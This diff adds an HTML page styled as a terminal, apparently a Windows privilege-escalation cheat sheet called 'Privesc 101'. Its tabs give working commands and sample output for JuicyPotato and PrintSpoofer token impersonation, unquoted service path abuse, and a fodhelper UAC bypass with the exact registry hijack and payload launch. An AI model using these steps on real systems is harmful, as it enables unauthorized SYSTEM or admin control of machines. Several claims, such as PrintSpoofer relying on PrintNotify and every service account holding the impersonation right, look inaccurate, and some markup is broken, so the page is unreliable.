@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PRIVESC 101 — 22nd Survey Division</title>
+<style>
+  :root {
+    --bg: #0c0c0c;
+    --fg: #cccccc;
+    --green: #0f0;
+    --red: #f44;
+    --yellow: #ff0;
+    --cyan: #0ff;
+    --magenta: #f0f;
+    --amber: #ffb000;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.6;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .terminal {
+    max-width: 900px;
+    margin: 0 auto;
+    background: #111;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 0 20px rgba(255,0,0,0.1);
+  }
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #333;
+  }
+  .header h1 {
+    color: var(--red);
+    font-size: 24px;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+  }
+  .tabs {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+  .tab {
+    background: #1a1a1a;
+    border: 1px solid #333;
+    color: #888;
+    padding: 10px 20px;
+    cursor: pointer;
+    border-radius: 4px;
+    transition: all 0.3s;
+    text-transform: uppercase;
+    font-size: 12px;
+    letter-spacing: 1px;
+  }
+  .tab:hover, .tab.active {
+    border-color: var(--red);
+    color: var(--red);
+  }
+  .tab.active {
+    background: var(--red);
+    color: #000;
+  }
+  .content { display: none; }
+  .content.active { display: block; }
+  .cmd-block {
+    background: #0a0a0a;
+    border: 1px solid #222;
+    border-radius: 4px;
+    padding: 15px;
+    margin-bottom: 15px;
+  }
+  .prompt { color: var(--red); }
+  .command { color: var(--fg); }
+  .output { color: #888; margin-top: 8px; padding-left: 20px; }
+  .highlight { color: var(--cyan); }
+  .warning { color: var(--red); }
+  .success { color: var(--green); }
+  .note {
+    color: var(--magenta);
+    font-style: italic;
+    margin-top: 10px;
+    padding: 10px;
+    background: #1a1a1a;
+    border-left: 3px solid var(--magenta);
+  }
+</style>
+</head>
+<body>
+
+<div class="terminal">
+  <div class="header">
+    <h1>Privesc 101 — Escalate or Die</h1>
+    <p>First Principle: You have SeImpersonatePrivilege. That's SYSTEM access waiting to happen.</p>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" onclick="showTab('tokens')">TOKENS</button>
+    <button class="tab" onclick="showTab('juicy')">JUICYPOTATO</button>
+    <button class="tab" onclick="showTab('print')">PRINTSPOOFER</button>
+    <button class="tab" onclick="showTab('services')">SERVICES</button>
+    <button class="tab" onclick="showTab('uac')">UAC BYPASS</button>
+  </div>
+
+  <div id="tokens" class="content active">
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">whoami /priv</span>
+      <div class="output">
+        Privilege Name                Description                              State<br>
+        ============================= ======================================== =======<br>
+        SeDebugPrivilege              Debug programs                           <span class="success">Enabled</span><br>
+        SeImpersonatePrivilege        Impersonate a client after auth          <span class="success">Enabled</span><br>
+        SeBackupPrivilege               Back up files and directories            <span class="success">Enabled</span><br>
+        SeRestorePrivilege              Restore files and directories            <span class="success">Enabled</span><br>
+        SeTakeOwnershipPrivilege        Take ownership of files                  <span class="success">Enabled</span><br>
+        SeLoadDriverPrivilege           Load and unload device drivers           <span class="success">Enabled</span><br>
+        SeSystemProfilePrivilege        Profile system performance               Enabled<br>
+        SeManageVolumePrivilege         Perform volume maintenance tasks         Enabled
+      </div>
+    </div>
+    
+    <div class="note">SeImpersonatePrivilege = SYSTEM. Every service account has it. The exploit is public and reliable.</div>
+  </div>
+
+  <div id="juicy" class="content">
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Users\Public\pwned.txt" -t *</span>
+      <div class="output">
+        Testing {CLSID} ...<br>
+        [+] Using CLSID: {6d18ad12-bde3-4393-b311-099c346e6df9}<br>
+        [+] Using Port: 1337<br>
+        [+] Using COM Listener<br>
+        [+] Using SpawnMethod: Standard<br>
+        [+] <span class="success">Exploit successful!</span><br>
+        [+] Output: nt authority\system
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">type C:\Users\Public\pwned.txt</span>
+      <div class="output">
+        nt authority\system
+      </div>
+    </div>
+    
+    <div class="note">JuicyPotato abuses DCOM activation to trigger a callback to a fake COM object, then impersonates the SYSTEM token. Works on every Windows version up to Server 2019.</div>
+  </div>
+
+  <div id="print" class="content">
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">PrintSpoofer.exe -i -c "whoami"</span>
+      <div class="output">
+        [+] Found printer: Microsoft Print to PDF<br>
+        [+] Spoofing pipe: \pipe\spoolss<br>
+        [+] Triggering print job...<br>
+        [+] <span class="success">Impersonated SYSTEM token</span><br>
+        [+] Running: whoami<br>
+        nt authority\system
+      </div>
+    </div>
+    
+    <div class="note">PrintSpoofer is the modern replacement for JuicyPotato. Uses the PrintNotify service instead of DCOM. Works on Windows 10/11 and Server 2022.</div>
+  </div>
+
+  <div id="services" class="content">
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """</span>
+      <div class="output">
+        Name              PathName                     StartMode<br>
+        ----              --------                     ---------<br>
+        AdobeARMservice   "C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe"  Auto<br>
+        AsusPTPService    C:\Program Files\ASUS\AsusPTPService\AsusPTPService.exe      Auto<br>
+        <span class="highlight">VulnService</span>       C:\Program Files\VulnApp\service.exe                        Auto
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">sc qc VulnService</span>
+      <div class="output">
+        [SC] QueryServiceConfig SUCCESS<br>
+        SERVICE_NAME: VulnService<br>
+        TYPE               : 10  WIN32_OWN_PROCESS<br>
+        START_TYPE         : 2   AUTO_START<br>
+        ERROR_CONTROL      : 1   NORMAL<br>
+        BINARY_PATH_NAME   : C:\Program Files\VulnApp\service.exe<br>
+        LOAD_ORDER_GROUP   :<br>
+        TAG                : 0<br>
+        DISPLAY_NAME       : VulnService<br>
+        DEPENDENCIES       :<br>
+        SERVICE_START_NAME : LocalSystem
+      </div>
+    </div>
+    
+    <div class="note">Unquoted service path + writable directory = instant SYSTEM. Replace the binary, restart the service, done.</div>
+  </div>
+
+  <div id="uac" class="content">
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin</span>
+      <div class="output">
+        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System<br>
+        ConsentPromptBehaviorAdmin    REG_DWORD    0x5<br>
+        <br>
+        0x5 = Prompt for consent for non-Windows binaries (default)r>
+        0x0 = Elevate without prompting (UAC disabled)r>
+        0x3 = Prompt for credentials
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">PS></span> <span class="command">// FODHELPER UAC BYPASS</span>
+      <div class="output">
+        // 1. Hijack HKCU\Software\Classes\ms-settings\shell\open\command<br>
+        // 2. Set default value to payload path<br>
+        // 3. Trigger fodhelper.exe (auto-elevates)<br>
+        // 4. Payload runs as admin, no prompt<br>
+        <br>
+        reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "C:\Users\Public\payload.exe" /f<br>
+        reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f<br>
+        start fodhelper.exe
+      </div>
+    </div>
+    
+    <div class="note">Fodhelper auto-elevates. Hijack its registry key, run your payload as admin without a prompt.</div>
+  </div>
+</div>
+
+<script>
+function showTab(tabId) {
+  document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById(tabId).classList.add('active');
+  event.target.classList.add('active');
+}
+</script>
+
+</body>
+</html>
